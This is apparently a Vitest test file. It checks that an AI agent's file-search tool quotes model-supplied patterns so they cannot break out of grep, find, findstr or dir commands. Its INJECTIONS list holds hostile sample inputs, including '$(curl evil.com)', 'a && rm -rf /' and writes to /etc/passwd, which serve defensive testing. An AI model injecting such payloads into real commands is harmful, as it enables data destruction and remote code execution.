/**
 * search-command — the agent `search_files` tool builds a shell command from a
 * model-supplied pattern. These tests pin that injection payloads cannot break
 * out of the quoting on either platform (the pattern must reach grep/findstr as
 * a single literal argument).
 */
import { describe, it, expect } from "vitest";
import {
  buildSearchCommand,
  shquotePosix,
} from "../../src/lib/search-command.js";

const INJECTIONS = [
  'x" ; curl evil ; "',
  "a && rm -rf /",
  "$(curl evil.com)",
  "`id`",
  "foo | tee /tmp/x",
  "a; shutdown -h now",
  "x' ; echo pwned ; '",
  "$HOME",
  "name > /etc/passwd",
];

describe("shquotePosix", () => {
  it("wraps in single quotes and escapes embedded single quotes", () => {
    expect(shquotePosix("abc")).toBe("'abc'");
    expect(shquotePosix("a'b")).toBe("'a'\\''b'");
    // The only character that can end a single-quoted string is ' itself, and
    // it's escaped — so nothing inside is interpretable by the shell.
    expect(shquotePosix("$(x)`y`|z&")).toBe("'$(x)`y`|z&'");
  });
});

describe("buildSearchCommand (POSIX)", () => {
  const onPosix = (pattern, isContent) =>
    buildSearchCommand({ pattern, isContent, platform: "linux" });

  it("single-quotes the pattern for content (grep) and filename (find)", () => {
    expect(onPosix("hello", true).cmd).toContain("grep -r -l -i 'hello' .");
    expect(onPosix("hello", false).cmd).toContain("find . -name '*hello*'");
  });

  it("neutralizes every injection payload (no unquoted breakout)", () => {
    for (const p of INJECTIONS) {
      for (const isContent of [true, false]) {
        const { cmd, error } = onPosix(p, isContent);
        expect(error).toBeUndefined();
        // The payload appears exactly once, inside a single-quoted span; the
        // only ' inside is the escaped form, so the shell never re-enters an
        // unquoted state mid-pattern.
        const quoted = isContent ? shquotePosix(p) : shquotePosix(`*${p}*`);
        expect(cmd).toContain(quoted);
      }
    }
  });
});

describe("buildSearchCommand (Windows)", () => {
  const onWin = (pattern, isContent) =>
    buildSearchCommand({ pattern, isContent, platform: "win32" });

  it("double-quotes the pattern for findstr and dir", () => {
    expect(onWin("hello", true).cmd).toBe('findstr /s /i /n "hello" *');
    expect(onWin("hello", false).cmd).toBe('dir /s /b "*hello*" 2>NUL');
  });

  it("keeps the redirect OUTSIDE the quotes (so 2>NUL still applies)", () => {
    expect(onWin("a&b", false).cmd).toBe('dir /s /b "*a&b*" 2>NUL');
    // & is literal inside cmd double-quotes → no command chaining.
  });

  it("rejects a pattern with an embedded double-quote (unescapable in cmd)", () => {
    expect(onWin('a" & calc', true).error).toMatch(/double-quote/);
    expect(onWin('x"', false).error).toMatch(/double-quote/);
  });

  it("quotes other shell metacharacters rather than rejecting them", () => {
    for (const p of INJECTIONS.filter((s) => !s.includes('"'))) {
      const { cmd, error } = onWin(p, true);
      expect(error).toBeUndefined();
      expect(cmd).toBe(`findstr /s /i /n "${p}" *`);
    }
  });
});
